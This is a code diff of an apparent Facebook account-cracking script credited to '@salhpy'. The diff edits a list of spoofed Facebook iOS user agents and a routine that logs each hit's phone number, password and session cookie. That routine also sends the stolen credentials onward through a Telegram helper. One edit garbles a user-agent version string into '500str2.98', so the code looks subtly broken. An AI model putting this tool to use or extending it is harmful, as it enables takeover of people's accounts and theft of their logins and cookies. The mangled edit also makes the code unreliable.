@@ -1244,7 +1244,7 @@ def u():
 "[FBAN/FBIOS;FBAV/440.0.0.27.105;FBBV/534120761;FBDV/iPhone7,1;FBMD/iPhone;FBSN/iOS;FBSV/18.3.2;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/583173016]",
 "[FBAN/FBIOS;FBAV/475.0.0.31.110;FBBV/266874774;FBDV/iPhone12,8;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/367766266]",
 "[FBAN/FBIOS;FBAV/412.0.0.40.114;FBBV/538498973;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/661999444]",
-"[FBAN/FBIOS;FBAV/500.0.0.52.98;FBBV/416644982;FBDV/iPhone12,8;FBMD/iPhone;FBSN/iOS;FBSV/16.3.1;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/577987153]",
+"[FBAN/FBIOS;FBAV/500str2.98;FBBV/416644982;FBDV/iPhone12,8;FBMD/iPhone;FBSN/iOS;FBSV/16.3.1;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/577987153]",
 "[FBAN/FBIOS;FBAV/440.0.0.27.105;FBBV/183438265;FBDV/iPhone13,2;FBMD/iPhone;FBSN/iOS;FBSV/16.7.10;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/104302558]",
 "[FBAN/FBIOS;FBAV/503.0.0.56.104;FBBV/142444144;FBDV/iPhone9,2;FBMD/iPhone;FBSN/iOS;FBSV/16.7.10;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/347462278]",
 "[FBAN/FBIOS;FBAV/503.0.0.56.104;FBBV/366891591;FBDV/iPhone13,2;FBMD/iPhone;FBSN/iOS;FBSV/15.7.8;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/115750566]",
@@ -1359,7 +1359,7 @@ Developer • @salhpy
         with open(f"{folder}/salh_ok.txt", 'a', encoding='utf-8') as f:
         	f.write(f"{phone}|{pas}\nCookie: {cookie_string}\nLink: https://www.facebook.com/profile.php?id={idd}\nApps: {apps}|{dates}\nExpired: {apps2}|{dates2}\nBY: @salhpy\n{'-'*40}\n")
     
-    elif 'www.facebook.com' in response_str or 'uid' in response_str:
+    elif 'www.facebook.com' in response_str:
                 CP += 1
                 ssend_teleG(phone, pas, idd, cookie_string, apps, dates, apps2, dates2)
                 print(اعادة + f'{ازرق}CP ACCUONT {phone} | {pas} {اعادة}{ذهبي} ~ {اعادة}{ازرق} @salhpy')
